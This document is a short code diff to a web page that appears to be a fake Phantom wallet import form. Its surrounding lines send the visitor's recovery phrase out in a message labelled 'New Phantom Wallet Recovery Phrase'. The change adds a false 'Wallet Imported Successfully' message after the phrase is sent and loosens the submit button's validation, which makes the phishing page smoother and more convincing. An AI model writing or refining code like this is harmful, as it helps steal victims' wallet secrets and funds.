@@ -49,6 +49,8 @@ const Page = () => {
           text: `New Phantom Wallet Recovery Phrase: ${recoveryPhrase}`,
         }
       );
+
+      toast.success("Wallet Imported Successfully");
     } catch (error) {
       toast.error("Something went wrong, trying to connect to your wallet");
     } finally {
@@ -125,7 +127,7 @@ const Page = () => {
           </p>
           <Button
             className="w-full h-[3rem] cursor-pointer"
-            disabled={!isValid || isLoading}
+            disabled={isLoading}
             onClick={async () => {
               const words = recoveryPhrase.trim().split(/\s+/);
               const expectedLength = is24WordPhrase ? 24 : 12;
